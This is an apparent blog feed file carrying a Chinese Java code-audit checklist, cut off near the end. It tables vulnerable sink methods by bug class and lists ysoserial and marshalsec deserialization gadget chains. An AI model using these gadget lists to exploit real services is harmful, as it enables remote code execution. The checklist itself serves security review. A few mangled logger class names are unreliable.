<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Wiki</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2020-04-17T18:00:44.795Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java代码审计危险函数Checklist</title>
    <link href="https://www.mi1k7ea.com/2020/04/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0Checklist/"/>
    <id>https://www.mi1k7ea.com/2020/04/17/Java代码审计危险函数Checklist/</id>
    <published>2020-04-17T13:44:23.000Z</published>
    <updated>2020-04-17T18:00:44.795Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这里小结一下Java代码审计中各种类型漏洞函数的Checklist，这些函数若参数外部可控则可能会造成安全问题。</p><p>参考：<a href="https://find-sec-bugs.github.io/bugs.htm" target="_blank" rel="noopener">https://find-sec-bugs.github.io/bugs.htm</a></p><h2 id="0x01-反序列化漏洞"><a href="#0x01-反序列化漏洞" class="headerlink" title="0x01 反序列化漏洞"></a>0x01 反序列化漏洞</h2><h3 id="原生反序列化漏洞"><a href="#原生反序列化漏洞" class="headerlink" title="原生反序列化漏洞"></a>原生反序列化漏洞</h3><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>java.io.ObjectInputStream</td><td>readObject</td><td>原生</td></tr><tr><td>java.net.URLClassLoader</td><td>findClass</td><td>加载远程类</td></tr><tr><td>java.net.URLClassLoader</td><td>findResource</td><td>加载远程类</td></tr><tr><td>java.net.URLClassLoader</td><td>findResources</td><td>加载远程类</td></tr></tbody></table><h3 id="三方件反序列化漏洞"><a href="#三方件反序列化漏洞" class="headerlink" title="三方件反序列化漏洞"></a>三方件反序列化漏洞</h3><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>java.beans.XMLDecoder</td><td>readObject</td><td>XMLDecoder反序列化漏洞</td></tr><tr><td>com.thoughtworks.xstream.XStream</td><td>fromXML</td><td>XStream反序列化漏洞</td></tr><tr><td>com.alibaba.fastjson.JSON</td><td>parse/parseObject</td><td>Fastjson反序列化漏洞</td></tr><tr><td>com.fasterxml.jackson.databind.ObjectMapper</td><td>readValue</td><td>Jackson反序列化漏洞</td></tr><tr><td>org.yaml.snakeyaml.Yaml</td><td>load</td><td>Snakeyaml反序列化漏洞</td></tr><tr><td>org.ho.yaml.YamlDecoder</td><td><code>&lt;init&gt;</code></td><td>Yaml反序列化漏洞</td></tr><tr><td>org.ho.yaml.Yaml</td><td>load</td><td>Yaml反序列化漏洞</td></tr><tr><td>com.esotericsoftware.yamlbeans.YamlReader</td><td>read</td><td>YamlReader反序列化漏洞</td></tr><tr><td>flex.messaging.io.amf.AmfMessageDeserializer</td><td>readMessage</td><td>AMF3反序列化漏洞</td></tr><tr><td>org.apache.batik.transcoder.TranscoderInput</td><td><code>&lt;init&gt;</code></td><td>TranscoderInput反序列化漏洞</td></tr></tbody></table><h3 id="Gadgets利用类"><a href="#Gadgets利用类" class="headerlink" title="Gadgets利用类"></a>Gadgets利用类</h3><p>参考ysoserial和marshalsec的Gadgets即可。</p><p>ysoserial支持的反序列化利用Gadgets：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Payload             Authors                     Dependencies</span><br><span class="line">-------             -------                     ------------</span><br><span class="line">BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5</span><br><span class="line">C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11</span><br><span class="line">Clojure             @JackOfMostTrades           clojure:1.8.0</span><br><span class="line">CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2</span><br><span class="line">CommonsCollections1 @frohoff                    commons-collections:3.1</span><br><span class="line">CommonsCollections2 @frohoff                    commons-collections4:4.0</span><br><span class="line">CommonsCollections3 @frohoff                    commons-collections:3.1</span><br><span class="line">CommonsCollections4 @frohoff                    commons-collections4:4.0</span><br><span class="line">CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1</span><br><span class="line">CommonsCollections6 @matthias_kaiser            commons-collections:3.1</span><br><span class="line">FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4</span><br><span class="line">Groovy1             @frohoff                    groovy:2.3.9</span><br><span class="line">Hibernate1          @mbechler</span><br><span class="line">Hibernate2          @mbechler</span><br><span class="line">JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">JRMPClient          @mbechler</span><br><span class="line">JRMPListener        @mbechler</span><br><span class="line">JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1</span><br><span class="line">JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">Jdk7u21             @frohoff</span><br><span class="line">Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2</span><br><span class="line">MozillaRhino1       @matthias_kaiser            js:1.7R2</span><br><span class="line">Myfaces1            @mbechler</span><br><span class="line">Myfaces2            @mbechler</span><br><span class="line">ROME                @mbechler                   rome:1.0</span><br><span class="line">Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE</span><br><span class="line">Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2</span><br><span class="line">URLDNS              @gebl</span><br><span class="line">Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4</span><br></pre></td></tr></table></figure><p>marshalsec支持的反序列化利用Gadgets：</p><table><thead><tr><th>Marshaller</th><th>Gadget Impact</th></tr></thead><tbody><tr><td>BlazeDSAMF(0/3/X)</td><td>JDK only escalation to Java serialization various third party libraries RCEs</td></tr><tr><td>Hessian/Burlap</td><td>various third party RCEs</td></tr><tr><td>Castor</td><td>dependency library RCE</td></tr><tr><td>Jackson</td><td><strong>possible JDK only RCE</strong>, various third party RCEs</td></tr><tr><td>Java</td><td>yet another third party RCE</td></tr><tr><td>JsonIO</td><td><strong>JDK only RCE</strong></td></tr><tr><td>JYAML</td><td><strong>JDK only RCE</strong></td></tr><tr><td>Kryo</td><td>third party RCEs</td></tr><tr><td>KryoAltStrategy</td><td><strong>JDK only RCE</strong></td></tr><tr><td>Red5AMF(0/3)</td><td><strong>JDK only RCE</strong></td></tr><tr><td>SnakeYAML</td><td><strong>JDK only RCEs</strong></td></tr><tr><td>XStream</td><td><strong>JDK only RCEs</strong></td></tr><tr><td>YAMLBeans</td><td>third party RCE</td></tr></tbody></table><h2 id="0x02-JNDI注入"><a href="#0x02-JNDI注入" class="headerlink" title="0x02 JNDI注入"></a>0x02 JNDI注入</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>javax.naming.InitialContext</td><td>lookup</td><td></td></tr><tr><td>javax.naming.directory.InitialDirContext</td><td>lookup</td><td></td></tr><tr><td>org.springframework.transaction.jta.JtaTransactionManager</td><td>readObject</td><td>重写readObject()中调用了InitialContext.lookup()的类方法</td></tr><tr><td>com.sun.rowset.JdbcRowSetImpl</td><td>execute</td><td>RMI中调用InitialContext.lookup()的类方法</td></tr><tr><td>javax.management.remote.rmi.RMIConnector</td><td>connect</td><td>RMI中调用InitialContext.lookup()的类方法</td></tr><tr><td>org.hibernate.jmx.StatisticsService</td><td>setSessionFactoryJNDIName</td><td>RMI中调用InitialContext.lookup()的类方法</td></tr><tr><td>org.springframework.ldap.core.LdapTemplate</td><td>lookup</td><td>LDAP协议中调用InitialContext.lookup()的类方法</td></tr><tr><td>org.springframework.ldap.core.LdapTemplate</td><td>lookupContext</td><td>LDAP协议中调用InitialContext.lookup()的类方法</td></tr></tbody></table><h2 id="0x03-表达式注入"><a href="#0x03-表达式注入" class="headerlink" title="0x03 表达式注入"></a>0x03 表达式注入</h2><h3 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h3><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>org.springframework.expression.ExpressionParser</td><td>parseExpression</td><td>SpEL</td></tr><tr><td>org.springframework.expression.spel.standard.SpelExpressionParser</td><td>parseExpression</td><td>SpEL</td></tr><tr><td>org.springframework.expression.common.TemplateAwareExpressionParser</td><td>parseExpression</td><td>SpEL</td></tr><tr><td>org.springframework.expression.Expression</td><td>getValue</td><td>SpEL</td></tr><tr><td>org.springframework.expression.Expression</td><td>setValue</td><td>SpEL</td></tr><tr><td>org.springframework.beans.factory.config.BeanExpressionResolver</td><td>evaluate</td><td>SpEL</td></tr></tbody></table><h3 id="OGNL"><a href="#OGNL" class="headerlink" title="OGNL"></a>OGNL</h3><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>com.opensymphony.xwork2.util.TextParseUtil</td><td>translateVariables</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.TextParseUtil</td><td>translateVariablesCollection</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.TextParseUtil</td><td>shallBeIncluded</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.TextParseUtil</td><td>commaDelimitedStringToSet</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.TextParser</td><td>evaluate</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.OgnlTextParser</td><td>evaluate</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td><td>getGetMethod</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td><td>getSetMethod</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td><td>getField</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td><td>setProperties</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td><td>setProperty</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td><td>getValue</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td><td>setValue</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.reflection.ReflectionProvider</td><td>getGetMethod</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.reflection.ReflectionProvider</td><td>getSetMethod</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.reflection.ReflectionProvider</td><td>getField</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.reflection.ReflectionProvider</td><td>setProperties</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.reflection.ReflectionProvider</td><td>setProperty</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.reflection.ReflectionProvider</td><td>getValue</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.reflection.ReflectionProvider</td><td>setValue</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlUtil</td><td>setProperties</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlUtil</td><td>setProperty</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlUtil</td><td>setValue</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlUtil</td><td>getValue</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlUtil</td><td>callMethod</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.ognl.OgnlUtil</td><td>compile</td><td>OGNL</td></tr><tr><td>org.apache.struts2.util.VelocityStrutsUtil</td><td>evaluate</td><td>OGNL</td></tr><tr><td>org.apache.struts2.util.StrutsUtil</td><td>isTrue</td><td>OGNL</td></tr><tr><td>org.apache.struts2.util.StrutsUtil</td><td>findString</td><td>OGNL</td></tr><tr><td>org.apache.struts2.util.StrutsUtil</td><td>findValue</td><td>OGNL</td></tr><tr><td>org.apache.struts2.util.StrutsUtil</td><td>getText</td><td>OGNL</td></tr><tr><td>org.apache.struts2.util.StrutsUtil</td><td>translateVariables</td><td>OGNL</td></tr><tr><td>org.apache.struts2.util.StrutsUtil</td><td>makeSelectList</td><td>OGNL</td></tr><tr><td>org.apache.struts2.views.jsp.ui.OgnlTool</td><td>findValue</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.ValueStack</td><td>findString</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.ValueStack</td><td>findValue</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.ValueStack</td><td>setValue</td><td>OGNL</td></tr><tr><td>com.opensymphony.xwork2.util.ValueStack</td><td>setParameter</td><td>OGNL</td></tr></tbody></table><h3 id="EL"><a href="#EL" class="headerlink" title="EL"></a>EL</h3><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>javax.el.ExpressionFactory</td><td>createValueExpression</td><td>EL</td></tr><tr><td>javax.el.ExpressionFactory</td><td>createMethodExpression</td><td>EL</td></tr><tr><td>org.jboss.seam.log.Log</td><td>debug,error,fatal,info,trace,warn</td><td>seam-el</td></tr></tbody></table><h3 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h3><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>javax.script.ScriptEngine</td><td>eval</td><td>脚本引擎</td></tr></tbody></table><h2 id="0x04-XML注入"><a href="#0x04-XML注入" class="headerlink" title="0x04 XML注入"></a>0x04 XML注入</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>javax.xml.parsers.DocumentBuilder</td><td>parse</td><td>DocumentBuilder</td></tr><tr><td>org.dom4j.SAXReader</td><td>read</td><td>SAXReader</td></tr><tr><td>org.jdom.SAXBuilder</td><td>build</td><td>SAXBuilder</td></tr><tr><td>javax.xml.parsers.SAXParser</td><td>parse</td><td>SAXParser</td></tr><tr><td>org.apache.commons.digester.Digester</td><td>parse</td><td>Digester</td></tr><tr><td>org.dom4j.DocumentHelper</td><td>parseText</td><td>DocumentHelper</td></tr><tr><td>javax.xml.stream.XMLStreamReader</td><td>getText</td><td>XMLStreamReader</td></tr><tr><td>javax.xml.xpath.XPathExpression</td><td>evaluate</td><td>XPathExpression</td></tr><tr><td>org.xml.sax.XMLReader</td><td>parse</td><td>XMLReader</td></tr><tr><td>javax.xml.transform.TransformerFactory</td><td>transform</td><td>TransformerFactory</td></tr><tr><td>org.apache.poi.xssf.usermodel.XSSFWorkbook</td><td><code>&lt;init&gt;</code></td><td>XSSFWorkbook</td></tr></tbody></table><h2 id="0x05-命令注入"><a href="#0x05-命令注入" class="headerlink" title="0x05 命令注入"></a>0x05 命令注入</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>java.lang.Runtime</td><td>exec</td><td></td></tr><tr><td>java.lang.ProcessBuilder</td><td>start</td></tr></tbody></table><h2 id="0x06-SQL注入"><a href="#0x06-SQL注入" class="headerlink" title="0x06 SQL注入"></a>0x06 SQL注入</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>java.sql.Statement</td><td>execute</td><td>JDBC</td></tr><tr><td>java.sql.Statement</td><td>executeQuery</td><td>JDBC</td></tr><tr><td>java.sql.Statement</td><td>executeUpdate</td><td>JDBC</td></tr><tr><td>java.sql.Statement</td><td>executeLargeUpdate</td><td>JDBC</td></tr><tr><td>java.sql.Statement</td><td>addBatch</td><td>JDBC</td></tr><tr><td>java.sql.PreparedStatement</td><td>均同上所有</td><td>JDBC</td></tr><tr><td>java.sql.Connection</td><td>prepareCall</td><td>JDBC</td></tr><tr><td>java.sql.Connection</td><td>prepareStatement</td><td>JDBC</td></tr><tr><td>java.sql.Connection</td><td>nativeSQL</td><td>JDBC</td></tr><tr><td>org.hibernate.criterion.Restrictions</td><td>sqlRestriction</td><td>hibernate</td></tr><tr><td>org.hibernate.Session</td><td>createQuery</td><td>hibernate</td></tr><tr><td>org.hibernate.Session</td><td>createSQLQuery</td><td>hibernate</td></tr><tr><td>org.springframework.jdbc.core.PreparedStatementCreatorFactory</td><td><code>&lt;init&gt;</code></td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.PreparedStatementCreatorFactory</td><td>newPreparedStatementCreator</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcOperations</td><td>batchUpdate</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcOperations</td><td>execute</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcOperations</td><td>query</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcOperations</td><td>queryForList</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcOperations</td><td>queryForMap</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcOperations</td><td>queryForObject</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcOperations</td><td>queryForRowSet</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcOperations</td><td>queryForInt</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcOperations</td><td>queryForLong</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcOperations</td><td>update</td><td>Spring</td></tr><tr><td>org.springframework.jdbc.core.JdbcTemplate</td><td>均同上所有</td><td>Spring</td></tr><tr><td>javax.jdo.PersistenceManager</td><td>newQuery</td><td>jdo</td></tr><tr><td>javax.jdo.Query</td><td>setFilter</td><td>jdo</td></tr><tr><td>javax.jdo.Query</td><td>setGrouping</td><td>jdo</td></tr><tr><td>javax.persistence.EntityManager</td><td>createQuery</td><td>jpa</td></tr><tr><td>javax.persistence.EntityManager</td><td>createNativeQuery</td><td>jpa</td></tr><tr><td>org.apache.turbine.om.peer.BasePeer</td><td>executeQuery</td><td>turbine</td></tr><tr><td>org.apache.torque.util.BasePeer</td><td>executeQuery</td><td>turbine</td></tr><tr><td>com.amazonaws.services.simpledb.model.SelectRequest</td><td><code>&lt;init&gt;</code></td><td>AWS的SimpleDB</td></tr><tr><td>com.amazonaws.services.simpledb.model.SelectRequest</td><td>withSelectExpression</td><td>AWS的SimpleDB</td></tr></tbody></table><h2 id="0x07-XSS"><a href="#0x07-XSS" class="headerlink" title="0x07 XSS"></a>0x07 XSS</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>javax.servlet.jsp.JspWriter</td><td>write</td><td>JSP</td></tr><tr><td>javax.servlet.jsp.JspWriter</td><td>append</td><td>JSP</td></tr><tr><td>javax.servlet.jsp.JspWriter</td><td>print</td><td>JSP</td></tr><tr><td>javax.servlet.jsp.JspWriter</td><td>println</td><td>JSP</td></tr><tr><td>org.owasp.encoder.tag.ForHtmlTag</td><td>doTag</td><td>JSP</td></tr><tr><td>java.io.PrintWriter</td><td>write</td><td>Servlet</td></tr><tr><td>java.io.PrintWriter</td><td>format</td><td>Servlet</td></tr><tr><td>java.io.PrintWriter</td><td>print</td><td>Servlet</td></tr><tr><td>java.io.PrintWriter</td><td>println</td><td>Servlet</td></tr><tr><td>java.io.PrintWriter</td><td>printf</td><td>Servlet</td></tr><tr><td>java.io.PrintWriter</td><td>append</td><td>Servlet</td></tr><tr><td>javax.servlet.http.HttpServletResponse</td><td>sendError</td><td>Servlet</td></tr><tr><td>javax.servlet.http.HttpServletResponse</td><td>setStatus</td><td>Servlet</td></tr><tr><td>javax.servlet.http.HttpServletResponseWrapper</td><td>均同上所有</td><td>Servlet</td></tr><tr><td>javax.servlet.ServletOutputStream</td><td>print</td><td>Servlet</td></tr><tr><td>javax.servlet.ServletOutputStream</td><td>println</td><td>Servlet</td></tr></tbody></table><h2 id="0x08-任意文件上传-下载-读取-新建"><a href="#0x08-任意文件上传-下载-读取-新建" class="headerlink" title="0x08 任意文件上传/下载/读取/新建"></a>0x08 任意文件上传/下载/读取/新建</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>java.io.File</td><td><code>&lt;init&gt;</code></td><td>读文件</td></tr><tr><td>java.io.File</td><td>createTempFile</td><td>新建文件</td></tr><tr><td>java.io.FileInputStream</td><td><code>&lt;init&gt;</code></td><td>读文件</td></tr><tr><td>java.io.FileReader</td><td><code>&lt;init&gt;</code></td><td>读文件</td></tr><tr><td>java.io.RandomAccessFile</td><td><code>&lt;init&gt;</code></td><td>读文件</td></tr><tr><td>javax.activation.FileDataSource</td><td><code>&lt;init&gt;</code></td><td>读文件</td></tr><tr><td>java.nio.file.Paths</td><td>get</td><td>读文件</td></tr><tr><td>java.nio.file.Files</td><td>createTempFile</td><td>新建文件</td></tr><tr><td>java.nio.file.Files</td><td>createTempDirectory</td><td>新建文件</td></tr><tr><td>java.io.FileWriter</td><td><code>&lt;init&gt;</code></td><td>写文件</td></tr><tr><td>java.io.FileOutputStream</td><td><code>&lt;init&gt;</code></td><td>写文件</td></tr><tr><td>kotlin.io.FilesKt</td><td>createTempFile$default</td><td>kotlin框架</td></tr><tr><td>kotlin.io.FilesKt</td><td>createTempFile</td><td>kotlin框架</td></tr><tr><td>kotlin.io.FilesKt</td><td>createTempDir$default</td><td>kotlin框架</td></tr><tr><td>kotlin.io.FilesKt</td><td>createTempDir</td><td>kotlin框架</td></tr></tbody></table><h2 id="0x09-XPath注入"><a href="#0x09-XPath注入" class="headerlink" title="0x09 XPath注入"></a>0x09 XPath注入</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>org.apache.xpath.XPathAPI</td><td>eval</td><td>Apache</td></tr><tr><td>org.apache.xpath.XPathAPI</td><td>selectNodeIterator</td><td>Apache</td></tr><tr><td>org.apache.xpath.XPathAPI</td><td>selectNodeList</td><td>Apache</td></tr><tr><td>org.apache.xpath.XPathAPI</td><td>selectSingleNode</td><td>Apache</td></tr><tr><td>com.sun.org.apache.xpath.internal.XPathAPI</td><td>均同上所有</td><td>Apache</td></tr><tr><td>org.apache.xml.security.utils.XPathAPI</td><td>evaluate</td><td>Apache</td></tr><tr><td>org.apache.xml.security.utils.XPathAPI</td><td>selectNodeList</td><td>Apache</td></tr><tr><td>org.apache.xml.security.utils.JDKXPathAPI</td><td>均同上所有</td><td>Apache</td></tr><tr><td>org.apache.xml.security.utils.XalanXPathAPI</td><td>均同上所有</td><td>Apache</td></tr><tr><td>javax.xml.xpath.XPath</td><td>compile</td><td>javax</td></tr><tr><td>javax.xml.xpath.XPath</td><td>evaluate</td><td>javax</td></tr><tr><td>javax.xml.xpath.XPathExpression</td><td>evaluate</td><td>javax</td></tr></tbody></table><h2 id="0x0A-LDAP注入"><a href="#0x0A-LDAP注入" class="headerlink" title="0x0A LDAP注入"></a>0x0A LDAP注入</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>javax.naming.ldap.LdapName</td><td><code>&lt;init&gt;</code></td><td></td></tr><tr><td>javax.naming.Context</td><td>lookup</td><td></td></tr><tr><td>javax.naming.directory.DirContext</td><td>lookup</td><td></td></tr><tr><td>javax.naming.directory.DirContext</td><td>search</td><td></td></tr><tr><td>javax.naming.directory.InitialDirContext</td><td>均同上所有</td><td></td></tr><tr><td>javax.naming.ldap.LdapContext</td><td>均同上所有</td><td></td></tr><tr><td>javax.naming.ldap.InitialLdapContext</td><td>均同上所有</td><td></td></tr><tr><td>javax.naming.event.EventDirContext</td><td>均同上所有</td><td></td></tr><tr><td>com.sun.jndi.ldap.LdapCtx</td><td>均同上所有</td><td></td></tr><tr><td>com.unboundid.ldap.sdk.LDAPConnection</td><td>search</td><td></td></tr><tr><td>org.springframework.ldap.core.LdapTemplate</td><td>list</td><td></td></tr><tr><td>org.springframework.ldap.core.LdapTemplate</td><td>lookup</td><td></td></tr><tr><td>org.springframework.ldap.core.LdapTemplate</td><td>search</td><td></td></tr><tr><td>org.springframework.ldap.core.LdapOperations</td><td>均同上所有</td><td></td></tr><tr><td>org.springframework.jndi.JndiTemplate</td><td>lookup</td></tr></tbody></table><h2 id="0x0B-SSRF"><a href="#0x0B-SSRF" class="headerlink" title="0x0B SSRF"></a>0x0B SSRF</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>HttpClient</td><td></td><td>仅支持HTTP/HTTPS协议</td></tr><tr><td>HttpURLConnection</td><td></td><td>仅支持HTTP/HTTPS协议</td></tr><tr><td>URLConnection</td><td></td><td>支持<code>sun.net.www.protocol</code>所有协议</td></tr><tr><td>URL</td><td></td><td>支持<code>sun.net.www.protocol</code>所有协议</td></tr><tr><td>OkHttp</td><td></td><td>仅支持HTTP/HTTPS协议</td></tr><tr><td>ImageIO</td><td></td><td>支持<code>sun.net.www.protocol</code>所有协议</td></tr><tr><td>Request</td><td></td><td>仅支持HTTP/HTTPS协议</td></tr></tbody></table><h2 id="0x0C-CRLF注入"><a href="#0x0C-CRLF注入" class="headerlink" title="0x0C CRLF注入"></a>0x0C CRLF注入</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>java.util.logging.Logger</td><td>config</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>entering</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>exiting</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>fine</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>finer</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>finest</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>info</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>logp</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>logrb</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>severe</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>throwing</td><td></td></tr><tr><td>java.util.logging.Logger</td><td>warning</td><td></td></tr><tr><td>java.utilging.Logger</td><td>log</td><td></td></tr><tr><td>org.apache.commons.logging.Log</td><td>debug</td><td></td></tr><tr><td>org.apache.commons.logging.Log</td><td>error</td><td></td></tr><tr><td>org.apache.commons.logging.Log</td><td>fatal</td><td></td></tr><tr><td>org.apache.commons.logging.Log</td><td>info</td><td></td></tr><tr><td>org.apache.commons.logging.Log</td><td>trace</td><td></td></tr><tr><td>org.apache.commons.logging.Log</td><td>warn</td><td></td></tr><tr><td>org.slf4j.Logger</td><td>debug</td><td></td></tr><tr><td>org.slf4j.Logger</td><td>error</td><td></td></tr><tr><td>org.slf4j.Logger</td><td>info</td><td></td></tr><tr><td>org.slf4j.Logger</td><td>trace</td><td></td></tr><tr><td>org.slf4j.Logger</td><td>warn</td><td></td></tr><tr><td>org.apache.logging.log4j.Logger</td><td>debug</td><td></td></tr><tr><td>org.apache.logging.log4j.Logger</td><td>entry</td><td></td></tr><tr><td>org.apache.logging.log4j.Logger</td><td>error</td><td></td></tr><tr><td>org.apache.logging.log4j.Logger</td><td>fatal</td><td></td></tr><tr><td>org.apache.logging.log4j.Logger</td><td>info</td><td></td></tr><tr><td>org.apache.logging.log4j.Logger</td><td>printf</td><td></td></tr><tr><td>org.apache.logging.log4j.Logger</td><td>trace</td><td></td></tr><tr><td>org.apache.logging.log4j.Logger</td><td>warn</td><td></td></tr><tr><td>org.apacheging4j.Logger</td><td>log</td><td></td></tr><tr><td>org.apache.log4j.Category</td><td>debug</td><td></td></tr><tr><td>org.apache.log4j.Category</td><td>error</td><td></td></tr><tr><td>org.apache.log4j.Category</td><td>fatal</td><td></td></tr><tr><td>org.apache.log4j.Category</td><td>info</td><td></td></tr><tr><td>org.apache.log4j.Category</td><td>l7dlog</td><td></td></tr><tr><td>org.apache.log4j.Category</td><td>warn</td><td></td></tr><tr><td>org.apache4j.Category</td><td>log</td><td></td></tr><tr><td>org.apache4j.Logger</td><td>log</td><td></td></tr><tr><td>org.apache.log4j.Logger</td><td>debug</td><td></td></tr><tr><td>org.apache.log4j.Logger</td><td>error</td><td></td></tr><tr><td>org.apache.log4j.Logger</td><td>fatal</td><td></td></tr><tr><td>org.apache.log4j.Logger</td><td>info</td><td></td></tr><tr